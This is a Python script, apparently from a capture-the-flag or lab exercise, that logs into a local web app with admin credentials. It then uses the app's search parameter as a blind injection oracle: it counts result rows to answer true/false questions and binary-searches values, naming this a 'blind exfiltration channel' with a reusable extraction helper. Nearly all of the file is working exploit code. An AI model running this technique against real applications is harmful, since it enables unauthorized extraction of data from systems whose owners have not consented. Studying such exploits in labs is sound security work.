import requests
from bs4 import BeautifulSoup

BASE_URL = "http://127.0.0.1:32882"

def login():
    """Login to get session cookie"""
    session = requests.Session()
    
    # First, get the login page to see what's there
    response = session.get(f"{BASE_URL}/login")
    print(f"[+] GET /login Status: {response.status_code}")
    
    # Login request
    login_data = {
        'username': 'admin',
        'password': 'admin123'
    }
    
    response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=True)
    print(f"[+] POST /login Status: {response.status_code}")
    print(f"[+] Final URL: {response.url}")
    
    # Verify session cookie
    print(f"[+] Cookies: {dict(session.cookies)}")
    
    # Test if we can access search
    test_response = session.get(f"{BASE_URL}/search")
    print(f"[+] GET /search Status: {test_response.status_code}")
    
    return session

def count_rows(session, term):
    """
    Make search request and count rows in tbody.
    Returns the number of rows found.
    """
    try:
        response = session.get(f"{BASE_URL}/search", params={'term': term})
        
        if response.status_code != 200:
            print(f"[-] Error: Status {response.status_code} for term: {term}")
            return 0
        
        soup = BeautifulSoup(response.text, 'html.parser')
        tbody = soup.find('tbody')
        
        if not tbody:
            return 0
        
        rows = tbody.find_all('tr')
        return len(rows)
    except Exception as e:
        print(f"[-] Exception in count_rows: {e}")
        return 0

def test_condition(session, expression):
    """
    Test if an expression evaluates to true (>0) or false (0).
    Uses pattern: term=10*(expression) 
    If expression is true/positive, we get results (rows > 0)
    If expression is false/0, we get no results (rows = 0)
    """
    term = f"10*({expression})"
    row_count = count_rows(session, term)
    return row_count > 0

def exfiltrate_number(session, expression, min_val=0, max_val=255):
    """
    Extract a numeric value using binary search.
    
    Args:
        session: Active requests session
        expression: The expression that evaluates to a number
        min_val: Minimum possible value
        max_val: Maximum possible value
    
    Returns:
        The extracted number
    """
    print(f"\n[*] Extracting value of: {expression}")
    print(f"[*] Search range: {min_val} to {max_val}")
    
    low = min_val
    high = max_val
    
    while low < high:
        mid = (low + high + 1) // 2
        
        # Test if expression > mid
        comparison = f"({expression})>{mid}"
        result = test_condition(session, comparison)
        
        print(f"[*] Testing ({expression}) > {mid}: {result}")
        
        if result:
            # Value is greater than mid
            low = mid + 1
        else:
            # Value is <= mid
            high = mid
    
    # Verify the found value
    if low == min_val:
        # Check if it's actually min_val or less
        comparison = f"({expression})>={min_val}"
        if not test_condition(session, comparison):
            print(f"[-] Value is less than {min_val}")
            return None
    
    print(f"[+] Extracted value: {low}")
    return low

def validate_channel(session):
    """
    Validate the exfiltration channel with known values.
    """
    print("\n" + "="*60)
    print("VALIDATING BLIND EXFILTRATION CHANNEL")
    print("="*60)
    
    test_cases = [
        ("7*7", 49),
        ("100-50", 50),
        ("8*8", 64),
        ("5+5", 10),
        ("20/4", 5),
        ("1", 1),
        ("0", 0)
    ]
    
    results = []
    
    for expression, expected in test_cases:
        extracted = exfiltrate_number(session, expression, min_val=0, max_val=255)
        
        if extracted == expected:
            status = "✓ PASS"
            results.append(True)
        else:
            status = "✗ FAIL"
            results.append(False)
        
        print(f"\n{status}: {expression} = {expected} (extracted: {extracted})")
        print("-" * 60)
    
    return results

def main():
    print("[*] Starting Blind Exfiltration Channel Test")
    print("[*] Target: " + BASE_URL)
    
    # Step 1: Login
    print("\n[Step 1] Logging in...")
    session = login()
    
    # Step 2: Test basic condition detection
    print("\n[Step 2] Testing condition detection...")
    print("[*] Testing: 1>0 (should be True)")
    result1 = test_condition(session, "1>0")
    print(f"[+] Result: {result1}")
    
    print("\n[*] Testing: 0>1 (should be False)")
    result2 = test_condition(session, "0>1")
    print(f"[+] Result: {result2}")
    
    if result1 and not result2:
        print("\n[+] Condition detection working correctly!")
    else:
        print("\n[-] Condition detection failed!")
        return
    
    # Step 3: Validate with known values
    print("\n[Step 3] Validating channel with known expressions...")
    results = validate_channel(session)
    
    # Summary
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    passed = sum(results)
    total = len(results)
    print(f"Tests passed: {passed}/{total}")
    
    if passed == total:
        print("[+] ✓ All tests passed - Channel validated successfully!")
    else:
        print(f"[-] ✗ {total - passed} test(s) failed")
    
    print("\n[+] Helper function ready: exfiltrate_number(session, expression, min_val, max_val)")
    print("[+] Example usage: exfiltrate_number(session, '7*7', 0, 255)")

if __name__ == "__main__":
    main()

